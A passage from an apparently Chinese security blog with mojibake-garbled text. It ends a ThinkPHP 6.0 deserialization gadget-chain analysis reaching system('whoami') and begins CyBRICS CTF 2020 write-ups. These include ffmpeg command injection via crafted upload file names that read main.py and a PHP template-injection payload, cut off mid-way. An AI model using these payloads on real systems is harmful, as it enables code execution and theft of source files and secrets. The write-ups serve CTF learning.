12345678910111213141516171819202122232425public function save(array $data = [], string $sequence = null): bool&#123; // æ•°æ®å¯¹è±¡èµ‹å€¼ $this-&gt;setAttrs($data); if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); if (false === $result) &#123; return false; &#125; // å†™å…¥å›è°ƒ $this-&gt;trigger('AfterWrite'); // é‡æ–°è®°å½•åŸå§‹æ•°æ® $this-&gt;origin = $this-&gt;data; $this-&gt;set = []; $this-&gt;lazySave = false; return true;&#125; è¿™é‡Œå…³é”®å‡½æ•°æ˜¯updateData.ä¸è¿‡æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬ä¸èƒ½è¿›å…¥ä¸Šé¢é‚£ä¸ªifåˆ†æ”¯ã€‚isEmptyä¸trigger 123456789101112public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; ...... æ˜¾ç„¶ã€‚éœ€è¦1.$this-&gt;dataä¸ºéç©ºæ•°ç»„ã€‚2.$this-&gt;withEventä¸ºfalse3.$this-&gt;existsä¸ºtrueè¿›å…¥updateDataå‡½æ•° è·Ÿè¿›åˆ°updateDataåã€‚æˆ‘ä»¬ä¸å¦¨å…ˆçœ‹ä¸‹å“ªä¸€ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨,å†å›å¤´è€ƒè™‘å‚æ•°çš„æ„é€ ã€‚è¿™é‡Œé¡ºç€çœ‹åˆ°checkAllowFieldså 1$table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); å­˜åœ¨å¯æ§å˜é‡çš„æ‹¼æ¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è§¦å‘__toStringäº†ã€‚åœ¨ç»å†äº†å‰é¢å‡ ä¸ªç‰ˆæœ¬çš„ååºåˆ—åŒ–æ„é€ åï¼Œæˆ‘ä»¬å½“ç„¶æ¸…æ¥štp5.1~5.2ç‰ˆæœ¬çš„é“¾å­åˆ†åˆ«æ˜¯__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)çš„ä¸€ç³»åˆ—è°ƒç”¨ã€‚é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç»§ç»­è¾¾æˆ__toStringæ¥å»¶ç»­é“¾å­ã€‚ å›å¤´å†æ£€æŸ¥updateDataè¿™çš„å‚æ•°éœ€è¦ã€‚é¦–å…ˆç¬¬ä¸€ä¸ªtriggeræˆ‘ä»¬å·²ç»æ»¡è¶³æ¡ä»¶äº†ã€‚ç„¶åif (empty($data))è¿™ä¸ªåˆ†æ”¯ä¸èƒ½è¿›å…¥ã€‚é‚£å°±è¦çœ‹å‘getChangedData 12345678910111213141516171819public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // åªè¯»å­—æ®µä¸å…è®¸æ›´æ–° foreach ($this-&gt;readonly as $key =&gt; $field) &#123; if (isset($data[$field])) &#123; unset($data[$field]); &#125; &#125; return $data;&#125; ä»¤$this-&gt;forceä¸ºtrue.ç„¶ådataå°±å¯æ§äº†ã€‚ æ¥ä¸‹æ¥æ˜¯å›åˆ°åˆ©ç”¨å‡½æ•°checkAllowFields.æ‹¼æ¥å¤„ä¹‹å‰çš„ä»£ç  12345if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db(); éœ€è¦1.$this-&gt;fieldä¸ºç©ºè¿›å…¥åˆ†æ”¯2.$this-&gt;schemaä¸ºç©ºè¿›å…¥else çœ‹ä¸€çœ¼db() 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix) -&gt;pk($this-&gt;pk); åŸæ¥db()å‡½æ•°è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªå˜é‡æ‹¼æ¥â€¦â€¦ä¸è¿‡æ®Šé€”åŒå½’ã€‚æˆ‘ä»¬ç”¨å“ªä¸€ä¸ªéƒ½å·®ä¸å¤šã€‚ä¾‹å¦‚expä¸­é“¾å­æ˜¯æŠŠ$this-&gt;suffixä½œä¸ºè§¦å‘çš„å¯¹è±¡çš„ã€‚ ç„¶ååé¢å°±æ˜¯ä¸€è·¯ç•…é€šäº†ã€‚è¿™é‡Œè·Ÿ5.1(æ³¨æ„ä¸æ˜¯5.0,5.0 çš„ toStringç”¨çš„æ˜¯modelç±»çš„)ä¸€æ ·ç”¨çš„æ˜¯Conversionç±»é‡Œçš„__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue() æˆ‘ä»¬ä¸»è¦åœ¨getAttr,getValueé‡Œæ„é€  123456789101112131415161718192021222324252627282930313233343536373839404142public function getAttr(string $name)&#123; try &#123; $relation = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; $relation = $this-&gt;isRelationAttr($name); $value = null; &#125; return $this-&gt;getValue($name, $value, $relation);&#125;public function getData(string $name = null)//$name='wh1t3p1g'&#123; if (is_null($name)) &#123; return $this-&gt;data; &#125; $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) &#123;//$this-&gt;data = array(\"wh1t3p1g\"=&gt;\"whoami\"); return $this-&gt;data[$fieldName];//è¿”å›'whoami'ï¼Œå›åˆ°getAttr &#125; elseif (array_key_exists($fieldName, $this-&gt;relation)) &#123; return $this-&gt;relation[$fieldName]; &#125;protected function getValue(string $name, $value, bool $relation = false)&#123; //$name='wh1t3p1g' $value=â€˜lsâ€™ $relation=false // æ£€æµ‹å±æ€§è·å–å™¨ $fieldName = $this-&gt;getRealFieldName($name); //è¯¥å‡½æ•°é»˜è®¤è¿”å›$name='wh1t3p1g'=$fieldName $method = 'get' . App::parseName($name, 1) . 'Attr'; //æ‹¼æ¥å­—ç¬¦ï¼šgetlinAttr if (isset($this-&gt;withAttr[$fieldName])) &#123; //['wh1t3p1g'=&gt;'system'] if ($relation) &#123; //$relation=false $value = $this-&gt;getRelationValue($name); &#125; $closure = $this-&gt;withAttr[$fieldName]; //$closure='system' $value = $closure($value, $this-&gt;data);//system('whoami',$this-&gt;data &#125; ....... return $value;&#125; è‡³æ­¤å®Œæˆæ•´æ¡åˆ©ç”¨é“¾ã€‚æ³¨æ„å®ƒçš„è°ƒç”¨æ–¹æ³•æ˜¯system(&quot;whoami&quot;, [&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;]).è¿™æ˜¯ä¸€ç§åˆæ³•è°ƒç”¨ã€‚ å°ç»“ä¸‹ã€‚tpæ‰€æœ‰ç³»åˆ—ååºåˆ—åŒ–é“¾å°±è¿™ä¹ˆå¤šäº†ã€‚å¤§ä½“ä¸Šæ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚åªæœ‰5.0ç‰ˆæœ¬æ˜¯è¾ƒä¸ºå¤æ‚çš„å†™æ–‡ä»¶ã€‚å…¶ä»–ç‰ˆæœ¬éƒ½å¯ä»¥ç›´æ¥rce.é­”æœ¯æ–¹æ³•ä¹ŸåŸºæœ¬éƒ½æ˜¯destructï¼ŒtoString,callè°ƒç”¨ã€‚å…¶ä¸­5.2,6.0æ˜¯æ²¡æœ‰callçš„å¿…è¦çš„ã€‚ tp6.0ä»»æ„æ–‡ä»¶å†™è¿™ä¸ªæ´å…¶å®æ²¡å¿…è¦è·Ÿäº†ã€‚å°±æ˜¯å¹´åichunqiuæˆ˜ç–«æ¯”èµ›æ—¶å‡ºç°è¿‡çš„æ´ã€‚sessionå¯ä»¥æ›´æ”¹æˆ32ä½.phpåç¼€ã€‚ç„¶åå¦‚æœsessionå†…å®¹å¯æ§çš„è¯å°±ç›¸å½“äºå†™äº†shell.è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒå¸¸è§çš„ã€‚ å°ç»“æ²¡æƒ³åˆ°çœŸçš„è¿˜æ˜¯æŠŠè¿™ä¸ªé¡¹ç›®çš„å†…å®¹éƒ½è·Ÿå®Œäº†ã€‚ä¸å¾—ä¸è¯´ç†è§£äº†ä¸€äº›åŸç†åä¹Ÿå°±å¯¹tpç³»åˆ—payloadçš„æ„é€ æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚è™½ç„¶å¤§éƒ¨åˆ†å®æˆ˜ä¸­é»‘ç›’åŸºæœ¬æµ‹ä¸å‡ºæ¥å°±æ˜¯äº†ã€‚ ä¸‹ä¸€æ­¥åœ¨è€ƒè™‘æ˜¯å»çœ‹çœ‹laravelè¿˜æ˜¯javaçš„å‡ ä¸ªååºåˆ—åŒ–é“¾å­ã€‚åŠ æ²¹å§","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"CyBRICS-CTF 2020","slug":"CyBRICS-CTF-2020","date":"2020-07-26T12:56:52.000Z","updated":"2021-02-18T05:08:54.237Z","comments":true,"path":"2020/07/26/CyBRICS-CTF-2020/","link":"","permalink":"https://www.bycsec.top/2020/07/26/CyBRICS-CTF-2020/","excerpt":"Cybricsæ¯”èµ›æ„Ÿè§‰éƒ½æ²¡é˜Ÿå‹åœ¨æ‰“â€¦â€¦ç®€å•è®°å½•ä¸‹åšçš„å‡ é“é¢˜","text":"Cybricsæ¯”èµ›æ„Ÿè§‰éƒ½æ²¡é˜Ÿå‹åœ¨æ‰“â€¦â€¦ç®€å•è®°å½•ä¸‹åšçš„å‡ é“é¢˜ Huntç­¾åˆ°ä¸è°ˆã€‚ Gif2pngé¦–å…ˆæ˜¯æºç å®¡è®¡. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109import loggingimport reimport subprocessimport uuidfrom pathlib import Pathfrom flask import Flask, render_template, request, redirect, url_for, flash, send_from_directoryfrom flask_bootstrap import Bootstrapimport osfrom werkzeug.utils import secure_filenameimport filetypeALLOWED_EXTENSIONS = &#123;'gif'&#125;app = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['SECRET_KEY'] = '********************************'app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 # 500KbffLaG = \"cybrics&#123;********************************&#125;\"Bootstrap(app)logging.getLogger().setLevel(logging.DEBUG)def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET', 'POST'])def upload_file(): logging.debug(request.headers) if request.method == 'POST': if 'file' not in request.files: logging.debug('No file part') flash('No file part', 'danger') return redirect(request.url) file = request.files['file'] if file.filename == '': logging.debug('No selected file') flash('No selected file', 'danger') return redirect(request.url) if not allowed_file(file.filename): logging.debug(f'Invalid file extension of file: &#123;file.filename&#125;') flash('Invalid file extension', 'danger') return redirect(request.url) if file.content_type != \"image/gif\": logging.debug(f'Invalid Content type: &#123;file.content_type&#125;') flash('Content type is not \"image/gif\"', 'danger') return redirect(request.url) if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: &#123;file.content_type&#125;') flash('Invalid filename', 'danger') return redirect(request.url) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)) mime_type = filetype.guess_mime(f'uploads/&#123;file.filename&#125;') if mime_type != \"image/gif\": logging.debug(f'Invalid Mime type: &#123;mime_type&#125;') flash('Mime type is not \"image/gif\"', 'danger') return redirect(request.url) uid = str(uuid.uuid4()) os.mkdir(f\"uploads/&#123;uid&#125;\") logging.debug(f\"Created: &#123;uid&#125;. Command: ffmpeg -i 'uploads/&#123;file.filename&#125;' \\\"uploads/&#123;uid&#125;/%03d.png\\\"\") command = subprocess.Popen(f\"ffmpeg -i 'uploads/&#123;file.filename&#125;' \\\"uploads/&#123;uid&#125;/%03d.png\\\"\", shell=True) command.wait(timeout=15) logging.debug(command.stdout) flash('Successfully saved', 'success') return redirect(url_for('result', uid=uid)) return render_template(\"form.html\")@app.route('/result/&lt;uid&gt;/')def result(uid): images = [] for image in os.listdir(f\"uploads/&#123;uid&#125;\"): mime_type = filetype.guess(str(Path(\"uploads\") / uid / image)) if image.endswith(\".png\") and mime_type is not None and mime_type.EXTENSION == \"png\": images.append(image) return render_template(\"result.html\", uid=uid, images=images)@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')def image(uid, image): logging.debug(request.headers) dir = str(Path(app.config['UPLOAD_FOLDER']) / uid) print(dir) return send_from_directory(dir, image)@app.errorhandler(413)def request_entity_too_large(error): return \"File is too large\", 413if __name__ == \"__main__\": app.run(host='localhost', port=5000, debug=False, threaded=True) æ³¨æ„åˆ°æ‰§è¡Œffmpegæœ‰ä¸ªå˜é‡æ‹¼æ¥ã€‚æˆ‘ä»¬çš„file.filenameå¯æ§ã€‚ä¸è¿‡éœ€è¦ç»è¿‡å‰é¢å‡ å±‚æ£€éªŒã€‚ç®€å•çœ‹å¯ä»¥å‘ç°ä¸€æ–¹é¢é™åˆ¶äº†åç¼€ï¼ˆå–æœ€åä¸€ä¸ª. åå­—ç¬¦æ£€æµ‹æ˜¯å¦ä¸ºgifï¼‰å¦å¤–é™åˆ¶äº†å¯ç”¨å­—ç¬¦ã€‚ä¸è¿‡è¿™äº›å­—ç¬¦å·²ç»å¤Ÿç”¨äº†ã€‚ é¦–å…ˆæˆ‘çš„æ€è·¯æ˜¯å»æ‰¾ffmpegçš„å¯ç”¨flag.é€šè¿‡-håˆ—å‡ºä¸€äº›flagåã€‚æˆ‘æ³¨æ„åˆ°è¿™æ ·å‡ ä¸ª 123-report generate a report-filter_script filename read stream filtergraph description from a file-metadata string=string add metadata è¿™é‡Œæˆ‘ä¸»è¦æ˜¯å¯»æ‰¾è·Ÿæ–‡ä»¶æœ‰å…³çš„é€‰é¡¹ã€‚å…¶ä¸­reportä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªlogæ–‡ä»¶ã€‚filter_scriptå¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä½œä¸ºstream filter. -metadata å¯ä»¥æ·»åŠ ä¸€ç»„é”®å€¼ã€‚åŠ å…¥åˆ°è¾“å‡ºçš„metadataä¸­ã€‚ ä¸è¿‡æœ¬åœ°è·‘èµ·æ¥ç®€å•å°è¯•ä¸‹åã€‚ä¼šå‘ç°å› ä¸ºæˆ‘ä»¬ä¸å¯ç”¨/å­—ç¬¦ã€‚æ‰€ä»¥æƒ³è¦æ§åˆ¶è·¯å¾„æ˜¯åšä¸åˆ°çš„ã€‚æˆ‘ä»¬å¿…é¡»è¦è®©åŒ…å«flagçš„ä¿¡æ¯è¾“å‡ºåˆ°uploadsçš„æ²™ç›’ä¸‹ã€‚è€Œæ³¨æ„åˆ°é¢˜ç›®/uploads/{uid}/ä¸‹çš„å†…å®¹å¹¶æ²¡æœ‰åƒå…¶ä»–ä¸¤ä¸ªè·¯ç”±é‚£æ ·åšæ–‡ä»¶ç±»å‹æ£€æŸ¥ã€‚æ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è®¿é—®çš„ã€‚ å› æ­¤-reportæ— æ³•ä½¿ç”¨ã€‚å› ä¸ºå®ƒåªèƒ½åœ¨å½“å‰ç›®å½•ç”ŸæˆæŠ¥å‘Šã€‚è€Œ-filter_scriptå‡å¦‚æ­é…-reportå€’æ˜¯å¯ä»¥æŠŠè¯»å–æ–‡ä»¶å†…å®¹æ—¶çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æ—¥å¿—ä¸­ã€‚ä½†æ˜¯å› ä¸ºæ—¥å¿—è¯»ä¸äº†æ‰€ä»¥ä¹Ÿä¸å¯è¡Œã€‚ äºæ˜¯æˆ‘å…³æ³¨ç‚¹å°±é›†ä¸­åˆ°äº†-metadataä¸Šã€‚æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„å‘½ä»¤é—­åˆå¼•å·å¹¶ä¸”æ‰§è¡Œã€‚ 1ffmpeg -i 'uploads/logo.gif' -metadata language=$(cat main.py| grep ffLaG |base64) -metadata abc='.gif' \"uploads/&#123;uid&#125;/%03d.png\" ä»è¾“å‡ºç»“æœä¸Šçœ‹æ˜¯æˆåŠŸæ‰§è¡Œå‘½ä»¤äº†çš„ã€‚ä½†æ˜¯æœ¬åœ°æµ‹è¯•å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚è¾“å‡ºçš„pngè¯»ä¸åˆ°å…¶metadataå±æ€§ã€‚ ç®€å•çš„æŸ¥é˜…äº†ä¸‹æ–‡æ¡£ä»¥åŠè°·æ­Œåæˆ‘æ¨æµ‹åº”è¯¥æ˜¯å› ä¸ºffmpegçš„metadataé€‰é¡¹ä¸æ”¯æŒpng.ä¸è¿‡æ–‡æ¡£é‡Œæˆ‘å‘ç°è§†é¢‘æ–‡ä»¶æ˜¯è‚¯å®šå¯ä»¥ä¿®æ”¹å¢åŠ metadataçš„ã€‚å› æ­¤å½“æˆ‘å°è¯•å°†ä¸Šé¢çš„å‘½ä»¤æ”¹ä¸ºè¾“å‡ºæˆaviåã€‚æ˜¯å¯ä»¥é€šè¿‡exiftoolè¯»å–åˆ°metadataä¸­çš„languageçš„ã€‚ é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªéœ€è¦ä¸€ä¸ªå¼ºè¿«è½¬æ¢è¾“å‡ºç±»å‹çš„flag. å†æ¬¡æŸ¥æ–‡æ¡£å‘ç°äº†-f fmt force formatã€‚æ‰€ä»¥æœ€ç»ˆpayloadå¦‚ä¸‹ã€‚æˆ‘ä»¬åªéœ€åœ¨ä¼ å¥½logo.gifåä¼ gifæ–‡ä»¶å¹¶ä»¥å¦‚ä¸‹ä½œä¸ºæ–‡ä»¶å 1logo.gif' -metadata language=$(cat main.py| grep ffLaG |base64) -f avi -metadata abc='.gif é¦–å…ˆæˆ‘ä»¬ä¿è¯äº†ç»“å°¾æœ€åçš„.æœ«å°¾æ˜¯gifç»•è¿‡åç¼€æ£€æŸ¥ã€‚ä¹‹åæ‰§è¡Œå‘½ä»¤æ—¶å°†ä¼šæŠŠmain.pyä¸­çš„ffLaGå˜é‡å€¼ä¿å­˜åˆ°è¾“å‡ºçš„language metadataä¸­ã€‚æœ¬åœ°è·‘èµ·æ¥çš„è¯ã€‚ä¼šå‘ç°åœ¨æ²™ç›’ä¸‹æœ€ç»ˆç”Ÿæˆäº†åä¸º%03d.pngçš„aviç±»å‹æ–‡ä»¶ã€‚å¹¶ä¸”å¯ä»¥ç”¨exiftoolè·å–åˆ°å…¶metadataã€‚ æœ¬åœ°æ‰“é€šçš„è¯å»è¿œç¨‹æ‰“è‚¯å®šå°±æ²¡é—®é¢˜äº†ã€‚è¿™é‡Œæ‰“è¿œç¨‹æ—¶ç¨å¾®å¤šå‘äº†å‡ æ¬¡åŒ…ã€‚æœ€ç»ˆè·å–åˆ°å›¾ç‰‡å¹¶å¾—åˆ°flag çœ‹ç€è¿™ä¸ªflagæˆ‘é«˜åº¦æ€€ç–‘è‡ªå·±ä¸æ˜¯é¢„æœŸåšçš„â€¦â€¦æä¸å¥½å¯ä»¥å¾ˆç®€å•è§£å†³æ‰ã€‚ ps:ä½›äº†ã€‚ä¸ä¼šå°±æˆ‘å»çœ‹ffmpegçš„flagsäº†å§â€¦â€¦è™½ç„¶åšæ³•å¾ˆæœ‰è¶£ä½†æ˜¯æœªå…å¤ªå‚»äº†â€¦â€¦åˆ«äººçš„payload:&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gifwtcltclã€‚å¿˜è®°ç”¨pwdæ‹¼æ¥ç›®å½•äº†ã€‚bash scriptéƒ½ç™½å†™äº†ã€‚ wocè¿™é“é¢˜ç›®æœ€ä¸»è¦çš„å°±æ˜¯ç”¨ä»£ç æ··æ·†è§†çº¿ã€‚æ‰€ä»¥å…³é”®åœ¨äºä¸€å®šè¦æ‰¾åˆ°çœŸæ­£å¯ä»¥åˆ©ç”¨çš„æ¼æ´ä»£ç ã€‚é¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨calc.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpif (!@$_SESSION['userid']) &#123; redir(\".\");&#125; elseif (!@$_GET['template']) &#123; redir(\".\");&#125;$userid = $_SESSION['userid'];$template = $_GET['template'];if (!preg_match('#^[a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;$#s', $template)) &#123; redir(\".\");&#125;if (!is_file(\"calcs/$userid/templates/$template.html\")) &#123; redir(\".\");&#125;if (trim(@$_POST['field'])) &#123; $field = trim($_POST['field']); if (!preg_match('#(?=^([ %()*+\\-./]+|\\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\\((?&gt;[^()]+|(?4))*\\)[^()]*)*)$#s', $field)) &#123; $value = \"BAD\"; &#125; else &#123; if (@$_POST['share']) &#123; $calc = uuid(); file_put_contents(\"calcs/$userid/$calc.php\", \"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\\n\" . file_get_contents(\"inc/calclib.html\") . file_get_contents(\"calcs/$userid/templates/$template.html\")); redir(\"?p=sharelink&amp;calc=$calc\"); &#125; else &#123; try &#123; $value = eval(\"return $field;\"); &#125; catch (Throwable $e) &#123; $value = null; &#125; if (!is_numeric($value) &amp;&amp; !is_string($value)) &#123; $value = \"ERROR\"; &#125; else &#123; $value = (string)$value; &#125; &#125; &#125; echo \"&lt;script&gt;var preloadValue = \" . json_encode($value) . \";&lt;/script&gt;\";&#125;require \"inc/calclib.html\";require \"calcs/$userid/templates/$template.html\"; ç¬¬ä¸€æƒ³æ³•è‚¯å®šæ˜¯åˆ©ç”¨é‚£ä¸ªeval.ä¸è¿‡è¿™é‡Œå­—ç¬¦å®åœ¨æ˜¯å¤ªé™åˆ¶äº†ã€‚æˆ‘å¾ˆå¿«å°±å‘ç°æ ¹æœ¬æ— æ³•æ„é€ å‡ºINF,NANä»¥å¤–ç­‰ç­‰å­—ç¬¦å¹¶å–å•ã€‚å› æ­¤å¾—å°è¯•å˜åŒ–æ€è·¯ã€‚ æ³¨æ„åˆ°é¢˜ç›®åŠŸèƒ½ã€‚æ•´ä½“ä¸Šæä¾›äº†ä¸€ä¸ªå‡æ³¨å†Œç™»å½•åŠŸèƒ½ç”¨æ¥è®°å½•session.åŒæ—¶å…è®¸æˆ‘ä»¬ä¸Šä¼ æ–°template.æˆ‘ä»¬å¯ä»¥æ ¹æ®calc.phpä¸­æ‰€ä¼ templateå‚æ•°é€‰æ‹©templateã€‚å‰å¾€newtemplate.phpã€‚å‘ç°å…¶é™åˆ¶äº†æˆ‘ä»¬templateçš„ä»£ç ä¸­ä¸èƒ½å«æœ‰&lt;?ä¸”å¿…é¡»åŒ…å«å®ƒè¦æ±‚çš„idæ ‡ç­¾ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpif (!@$_SESSION['userid']) &#123; redir(\".\");&#125;$userid = $_SESSION['userid'];$error = false;if (trim(@$_POST['html'])) &#123; do &#123; $html = trim($_POST['html']); if (strpos($html, '&lt;?') !== false) &#123; $error = \"Bad chars\"; break; &#125; $requiredBlocks = [ 'id=\"back\"', 'id=\"field\" name=\"field\"', 'id=\"digit0\"', 'id=\"digit1\"', 'id=\"digit2\"', 'id=\"digit3\"', 'id=\"digit4\"', 'id=\"digit5\"', 'id=\"digit6\"', 'id=\"digit7\"', 'id=\"digit8\"', 'id=\"digit9\"', 'id=\"plus\"', 'id=\"equals\"', ]; foreach ($requiredBlocks as $block) &#123; if (strpos($html, $block) === false) &#123; $error = \"Missing required block: '$block'\"; break(2); &#125; &#125; $uuid = uuid(); if (!file_put_contents(\"calcs/$userid/templates/$uuid.html\", $html)) &#123; $error = \"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts\"; break; &#125; redir(\".\"); &#125; while (false);&#125;?&gt; &lt;div class=\"row\"&gt; &lt;div class=\"p-5 mx-auto col-10 col-md-10 bg-info\"&gt;&lt;?phpif ($error) &#123;?&gt; &lt;div class=\"alert alert-danger\" role=\"alert\"&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"alert\"&gt;Ã—&lt;/button&gt; &lt;h4 class=\"alert-heading\"&gt;Error&lt;/h4&gt; &lt;p class=\"mb-0\"&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt; &lt;/div&gt;&lt;?php&#125;?&gt; &lt;h3 class=\"display-3\"&gt;New template&lt;/h3&gt; &lt;div class=\"px-4 order-1 order-md-2 col-lg-12\"&gt; &lt;h2 class=\"mb-4\"&gt;Insert code&lt;/h2&gt; &lt;form method=\"POST\"&gt; &lt;div class=\"form-group\"&gt; &lt;textarea style=\"min-height: 100px; font-family: 'Fira Code', Consolas, monospace;\" placeholder=\"HTML\" class=\"form-control form-control-sm\" name=\"html\" oninput=\"this.style.height = ''; this.style.height = (this.scrollHeight + 10) +'px'\"&gt;&lt;?=htmlspecialchars(@$_POST['html'])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-lg btn-outline-secondary mx-3 px-3\"&gt;&lt;i class=\"fa fa-plus-square fa-fw fa-1x py-1\"&gt;&lt;/i&gt; Create Template&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; ç„¶åæˆ‘ä»¬å‘ç°ã€‚calc.phpå¦‚æœä¸ä¼ é€’shareå‚æ•°çš„è¯ã€‚å°†åªæ˜¯ç®€å•çš„requireæˆ‘ä»¬çš„template.ä½†æ˜¯å€˜è‹¥ä¼ é€’share.åˆ™å°†è¿›è¡Œä¸€ä¸ªæ‹¼æ¥ã€‚ 12345if (@$_POST['share']) &#123; $calc = uuid(); file_put_contents(\"calcs/$userid/$calc.php\", \"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\\n\" . file_get_contents(\"inc/calclib.html\") . file_get_contents(\"calcs/$userid/templates/$template.html\")); redir(\"?p=sharelink&amp;calc=$calc\");&#125; æˆ‘ä»¬çš„å˜é‡fieldä¸ä¹‹åçš„inc/calclib.htmlï¼Œä»¥åŠè‡ªå·±çš„templateè¿›è¡Œæ‹¼æ¥ã€‚å½“å†…å®¹ä½œä¸ºfile_put_contentsçš„å‚æ•°å†™è¿›æ–°çš„phpæ–‡ä»¶æ—¶ã€‚&lt;?=æ€»æ˜¯å¯ç”¨çš„(å³ä½œä¸ºecho è°ƒç”¨)é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è§£å†³æ‰ä¸­é—´æ‹¼æ¥çš„æ–‡ä»¶inc/calclib.htmlå³å¯ã€‚é€šè¿‡ä½¿ç”¨æ³¨é‡Šç¬¦å°†ä¸¤è€…ä¸­é—´çš„htmlæ–‡ä»¶æ³¨é‡Šæ‰ï¼Œå¹¶åœ¨templateä¸­å†™å…¥æ¶æ„ä»£ç å°±èƒ½å®Œæˆ æœ¬åœ°æ¨¡æ‹Ÿå†™å…¥çš„æ–‡ä»¶ã€‚å¯ä»¥çœ‹åˆ°ä¸­é—´çš„éƒ¨åˆ†è¢«æ³¨é‡Šæ‰ã€‚æˆ‘ä»¬åªéœ€æ³¨æ„æ­£ç¡®é—­åˆæ‹¬å·ã€‚payloadhtmlå†…å®¹ 1234567891011121314151617181920212223&lt;html&gt;&lt;body&gt;&lt;input type=\"text\" class=\"part\" id=\"field\" name=\"field\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit0\" data-append=\"0\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit1\" data-append=\"1\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit2\" data-append=\"2\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit3\" data-append=\"3\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit4\" data-append=\"4\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit5\" data-append=\"5\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit6\" data-append=\"6\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit7\" data-append=\"7\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit8\" data-append=\"8\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit9\" data-append=\"9\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"plus\" data-append=\" + \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"minus\" data-append=\" - \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"times\" data-append=\" * \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"div\" data-append=\" / \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"point\" data-append=\".\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"clear\" 